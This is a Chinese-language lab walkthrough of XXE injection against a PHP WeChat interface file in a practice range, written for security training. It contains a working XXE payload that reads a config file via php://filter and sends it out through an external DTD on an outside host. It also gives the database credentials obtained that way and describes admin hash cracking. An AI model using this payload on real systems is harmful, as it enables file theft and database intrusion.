# Chapter 8.5 XXE实体注入

## 0x00 漏洞简介

> XML指可扩展标记语言（EXtensible Markup Language），它是一种类似于HTML的标记语言，专门用于存储文本数据。XML需要自定义标签，具有自我描述性。
>
> XML结构：
>
> 1. 声明结构
> 2. DTD部分
> 3. XML数据

XXE（外部实体注入）是XML注入的一种，普通的XML注入利用面比较狭窄，如果有的话也是逻辑类漏洞。XXE扩大了攻击面。

当允许引用外部实体时，就可能导致**任意文件读取、系统命令执行、内网端口探测、攻击内网网站**等危害

## 0x01 漏洞复现

1. 这是一个微信提供的官方文件，这个文件爆出了一个漏洞。本题是在weixin/index.php下全局搜索`simplexml_load_string()`函数。

	![](https://nc0.cdn.zkaq.cn/md/5371/9d0931ff12439e8ee31758601b008907_21922.png)
2. 要求变量signature不为空，变量echostr为空时才会执行。抓包的时候是GET传参，需要修改为可以自定义传参的POST方式。

	![](https://nc0.cdn.zkaq.cn/md/5371/656d3fa911cd83618540d76d921e7609_31245.png)
	![](https://nc0.cdn.zkaq.cn/md/5371/0f2f5287025e8fbe706df41da7a5890b_80284.png)
3. 传过去后页面报错，证明漏洞说明生效了找不到1.txt文件 但是找到了绝对路径C:\phpStudy\scms\weixin\index.php

	![](https://nc0.cdn.zkaq.cn/md/5371/61b9f04f71ffa06d4fa661510c56461a_62909.png)
4. 根据源码我们可以发现路径中有scms/conn/conn.php，里面存放着数据库的账号和密码。可以使用构建好的XXE语句去读取mysqli_connect里面的内容

   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE ANY[
   <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=C:/phpStudy/scms/conn/conn.php">
   <!ENTITY % remote SYSTEM "http://59.63.200.79:8017/1.xml"> 
   %remote;
   %send;
   ]>
   ```

	![](https://nc0.cdn.zkaq.cn/md/5371/e7e413b48404b84ddfa543a9200269cf_56758.png)
	![](https://nc0.cdn.zkaq.cn/md/5371/8773bce0ea5902cc25949903b2d5fac2_94726.png)
5. 重复刚才的操作，传参写入XXE语句。通过XXE炮台进入http://59.63.200.79:8017/3.txt/ 后就会看到一串base64编码，在网页上进行解码就得到。虽然解码不全，但是数据库的账号和密码都在

   ```$conn=mysqli_connect("192.168.0.10","xxe","teiwo!8#7ERe1DPC", "scms");```

	![](https://nc0.cdn.zkaq.cn/md/5371/fb70125d7f4c9f72c263bd31b5f74006_40841.png)
	![](https://nc0.cdn.zkaq.cn/md/5371/89e57748abe169a628d5f1b4ca5993fd_70433.png)
	![](https://nc0.cdn.zkaq.cn/md/5371/b2241bcbc614772db9566f07d07239a1_74717.png)

6. 靶场留了一个adminer.php(在线数据库管理工具) 输入用户名(xxe),密码(teiwo!8#7ERe1DPC)和库名(scms)就可以登入了

	![](https://nc0.cdn.zkaq.cn/md/5371/b308291dacd2a23f265a445a51c22afc_33039.png)

7. 进去后找到管理员的密码然后进行MD5解码就完成了靶场

	![](https://nc0.cdn.zkaq.cn/md/5371/9c882a2fd1fd101cee7b08fa6947b0da_28789.png)
	![](https://nc0.cdn.zkaq.cn/md/5371/bbc685d5f32dd5b7cc3c14e35e433351_31074.png)